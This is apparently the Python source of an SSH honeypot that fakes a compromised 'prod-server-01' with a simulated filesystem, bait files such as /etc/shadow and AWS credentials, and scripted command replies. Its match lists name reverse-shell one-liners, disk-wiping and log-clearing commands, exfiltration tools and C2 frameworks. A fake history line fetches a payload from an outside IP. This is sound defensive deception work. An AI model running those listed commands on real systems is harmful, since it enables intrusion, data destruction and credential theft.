import shlex
from core.config import (
    FAKE_AWS_ACCESS_KEY_ID,
    FAKE_AWS_SECRET_ACCESS_KEY,
    FAKE_AWS_ECHO,
    FAKE_SECRET_ECHO,
)


FAKE_FS = {
    "/": ["bin", "boot", "dev", "etc", "home", "opt", "proc", "root", "tmp", "usr", "var"],
    "/boot": ["grub", "vmlinuz", "initrd.img"],
    "/dev": ["null", "zero", "random", "urandom", "sda", "vda", "nvme0n1", "swap", "pts"],
    "/etc": ["passwd", "shadow", "hostname", "hosts", "group", "sudoers", "ssh", "systemd", "cron.d"],
    "/etc/ssh": ["sshd_config", "ssh_config", "known_hosts"],
    "/etc/systemd": ["system", "user"],
    "/home": ["admin", "ubuntu", "user", "developer"],
    "/home/admin": [".bash_history", ".ssh", "notes.txt", "backup.tar.gz"],
    "/home/admin/.ssh": ["id_rsa", "authorized_keys", "known_hosts", "config"],
    "/home/ubuntu": [".bashrc", "projects", "downloads", ".aws"],
    "/home/ubuntu/.aws": ["credentials", "config"],
    "/opt": ["mysql", "redis", "custom_app"],
    "/proc": ["cpuinfo", "meminfo", "version", "self", "1"],
    "/root": [".bash_history", ".ssh", "loot", "scripts"],
    "/root/.ssh": ["authorized_keys", "id_rsa", "id_ed25519"],
    "/tmp": ["payload.sh", "rev.sh", "tmp.bin"],
    "/var": ["log", "www", "spool"],
    "/var/log": ["auth.log", "syslog", "kern.log", "wtmp", "btmp", "lastlog"],
    "/var/www": ["html"],
    "/var/www/html": ["index.html", "health.php"],
}


FAKE_FILES = {
    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash\nubuntu:x:1001:1001::/home/ubuntu:/bin/bash\n",
    "/etc/shadow": "root:$6$hash$redacted:19800:0:99999:7:::\nadmin:$6$hash$redacted:19800:0:99999:7:::\n",
    "/etc/group": "root:x:0:\nsudo:x:27:admin,ubuntu\ndocker:x:998:ubuntu\n",
    "/etc/sudoers": "root ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n",
    "/etc/hostname": "prod-server-01\n",
    "/etc/hosts": "127.0.0.1 localhost\n192.168.1.1 gateway\n10.0.0.21 prod-server-01\n",
    "/proc/version": "Linux version 5.15.0-91-generic (buildd@lcy02-amd64-030) #101-Ubuntu SMP\n",
    "/proc/cpuinfo": "processor\t: 0\nmodel name\t: Intel(R) Xeon(R) CPU\ncpu cores\t: 2\n",
    "/proc/meminfo": "MemTotal:        4048576 kB\nMemFree:         1320448 kB\n",
    "/home/admin/.bash_history": "sudo systemctl restart ssh\ncat /etc/passwd\n",
    "/root/.bash_history": "whoami\ncd /tmp\nwget http://198.51.100.23/payload.sh\n",
    "/home/admin/.ssh/known_hosts": "10.0.0.12 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...\n",
    "/home/admin/.ssh/config": "Host db\n  HostName 10.0.0.12\n  User admin\n",
    "/home/ubuntu/.aws/credentials": (
        "[default]\n"
        f"aws_access_key_id = {FAKE_AWS_ACCESS_KEY_ID}\n"
        f"aws_secret_access_key = {FAKE_AWS_SECRET_ACCESS_KEY}\n"
    ),
}


GENERIC_MATCHES = [
    (["dd if=/dev/zero", "dd if=/dev/urandom", "dd of=/dev/sda", "dd of=/dev/vda", "dd of=/dev/nvme", "dd of=/dev/hda", "dd of=/dev/swap"], "dd: writing to '/dev/sda': No space left on device\n1048576+0 records in\n1048575+0 records out\n"),
    (["shred -", "wipe /dev", "rm --no-preserve-root", "rm -rf /"], ""),
    (["openssl enc", "gpg --encrypt", "gpg -c"], ""),
    (["bash -i", "/dev/tcp/", "nc -e", "ncat -e", "netcat -e", "nc -c bash", "perl -e 'use Socket", "ruby -rsocket", "php -r", "lua -e", "socat tcp:", "xterm -display"], ""),
    (["insmod", "modprobe", "LD_PRELOAD=", "ld.so.preload", "bpftool", "bpftrace", "ptrace", "process_vm_writev"], ""),
    (["iptables -F", "iptables --flush", "iptables -t nat", "ufw disable", "service iptables stop"], ""),
    (["history -c", "unset HISTFILE", "truncate -s0 /var/log", "echo '' > /var/log"], ""),
    (["setenforce 0", "setenforce Permissive", "aa-disable", "apparmor_parser -R", "auditctl -e 0"], ""),
    (["crontab -e", "at now", "at -f", "systemctl enable", "systemctl start", "authorized_keys", "/etc/cron", "/etc/systemd/system/"], ""),
    (["sudo su", "sudo bash", "sudo -s", "sudo -i", "su root", "su -", "visudo", "NOPASSWD", "chmod 777", "chmod +s", "chmod 4755", "setcap cap_"], ""),
    (["find / -perm -4000", "find / -perm -2000", "find / -perm /4000"], "/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/chsh\n"),
    (["ssh -L 3389", "ssh -R 3389", "ssh -D", "sshpass -p", "proxychains", "chisel", "frp", "ligolo"], ""),
    (["curl -X POST", "curl --data", "curl -d", "curl -F", "wget --post-data", "scp ", "rsync ", "sftp ", "ftp ", "lftp", "ncftp", "iodine", "dnscat", "dns2tcp"], ""),
    (["nmap", "masscan", "zmap", "nikto", "unicornscan", "sqlmap", "wfuzz", "gobuster", "dirb", "feroxbuster", "wpscan", "hydra", "medusa", "ncrack", "patator", "crowbar"], ""),
    (["tcpdump", "tshark", "wireshark", "ettercap", "dsniff", "tcpflow", "arpspoof", "arping", "bettercap", "knock", "knockd"], ""),
    (["docker run", "docker exec", "kubectl exec", "nsenter", "runc", "/var/run/docker.sock", "docker -H unix://"], ""),
    (["searchsploit", "msfconsole", "msfvenom", "exploit-db", "dirtycow", "baron_samedit"], ""),
    (["ngrok", "cloudflared tunnel", "cobaltstrike", "beacon.exe", "sliver-client", "empire", "havoc"], ""),
    (["logkeys", "showkey --scancodes", "xinput test", "keepass", "bw unlock", "bw get item", "gcore", "cat /proc/*/mem"], ""),
]


def _normalize_path(path: str, cwd: str) -> str:
    if not path:
        return cwd
    if path.startswith("/"):
        raw = path
    elif cwd == "/":
        raw = "/" + path
    else:
        raw = cwd + "/" + path
    segments = []
    for part in raw.split("/"):
        if part in ("", "."):
            continue
        if part == "..":
            if segments:
                segments.pop()
            continue
        segments.append(part)
    return "/" + "/".join(segments)


def _parse(cmd: str) -> list[str]:
    try:
        return shlex.split(cmd)
    except ValueError:
        return cmd.split()


def _match_generic(cmd: str) -> str | None:
    lower = cmd.lower()
    for needles, out in GENERIC_MATCHES:
        if any(n.lower() in lower for n in needles):
            return out
    return None


def handle_command(cmd: str, cwd: str) -> tuple[str, str]:
    cmd = cmd.strip()
    if not cmd:
        return "", cwd

    parts = _parse(cmd)
    if not parts:
        return "", cwd

    base = parts[0]

    if cmd in ("exit", "logout"):
        return "__EXIT__", cwd

    if cmd == "whoami":
        return "root\n", cwd
    if cmd in ("id", "id -a"):
        return "uid=0(root) gid=0(root) groups=0(root),27(sudo),998(docker)\n", cwd
    if cmd == "pwd":
        return cwd + "\n", cwd
    if cmd == "uname -a":
        return "Linux prod-server-01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux\n", cwd
    if cmd == "uname -r":
        return "5.15.0-91-generic\n", cwd
    if cmd == "hostname":
        return "prod-server-01\n", cwd

    if base == "cd":
        target = "/" if len(parts) == 1 else _normalize_path(parts[1], cwd)
        if target in FAKE_FS:
            return "", target
        return f"bash: cd: {parts[1] if len(parts) > 1 else '/'}: No such file or directory\n", cwd

    if base == "ls":
        target = cwd if len(parts) == 1 else _normalize_path(parts[-1], cwd)
        if target in FAKE_FS:
            return ("  ".join(FAKE_FS[target]) + "\n") if FAKE_FS[target] else "", cwd
        return f"ls: cannot access '{parts[-1]}': No such file or directory\n", cwd

    if base == "cat" and len(parts) > 1:
        path = _normalize_path(parts[1], cwd)
        if path in FAKE_FILES:
            return FAKE_FILES[path], cwd
        return f"cat: {parts[1]}: No such file or directory\n", cwd

    if cmd.startswith("grep root /etc/passwd"):
        return "root:x:0:0:root:/root:/bin/bash\n", cwd

    if base in ("ps", "top", "pstree"):
        return "root       1  0.0  0.3  22584  3980 ?        Ss   09:10   0:01 /sbin/init\nroot     731  0.0  0.4 117540  4932 ?        Ssl  09:11   0:00 /usr/sbin/sshd -D\nwww-data 1183 0.1  1.2 258120 12440 ?        Ssl  09:12   0:03 /usr/sbin/nginx -g daemon off;\n", cwd

    if base in ("netstat", "ss"):
        return "tcp   LISTEN 0      128      0.0.0.0:22       0.0.0.0:*\ntcp   LISTEN 0      511      0.0.0.0:80       0.0.0.0:*\ntcp   LISTEN 0      128      127.0.0.1:3306   0.0.0.0:*\n", cwd

    if base == "ip" and len(parts) > 1 and parts[1] == "route":
        return "default via 10.0.0.1 dev eth0\n10.0.0.0/24 dev eth0 proto kernel scope link src 10.0.0.21\n", cwd

    if base == "ifconfig":
        return "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.0.0.21  netmask 255.255.255.0  broadcast 10.0.0.255\n", cwd

    if base in ("printenv", "env") or cmd.startswith("export -p"):
        return "HOME=/root\nHOSTNAME=prod-server-01\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nSSH_AUTH_SOCK=/tmp/ssh-abcd/agent.1234\nAWS_REGION=us-east-1\n", cwd

    if cmd.startswith("echo $"):
        if "AWS" in cmd:
            return f"{FAKE_AWS_ECHO}\n", cwd
        if "SECRET" in cmd or "TOKEN" in cmd:
            return f"{FAKE_SECRET_ECHO}\n", cwd
        return "\n", cwd

    if base == "history":
        return "  1 whoami\n  2 id\n  3 uname -a\n  4 cat /etc/passwd\n", cwd

    if base in ("wget", "curl", "fetch", "lwp-download"):
        if "169.254.169.254" in cmd or "metadata.google.internal" in cmd or "169.254.170.2" in cmd:
            return "{\"instanceId\":\"i-0ab1c2d3\",\"region\":\"us-east-1\"}\n", cwd
        return "", cwd

    generic = _match_generic(cmd)
    if generic is not None:
        return generic, cwd

    if base in ("touch", "mkdir", "cp", "mv", "rm", "chmod", "chown", "tee", "truncate", "sed", "awk", "sort", "uniq", "head", "tail", "wc"):
        return "", cwd

    return f"bash: {base}: command not found\n", cwd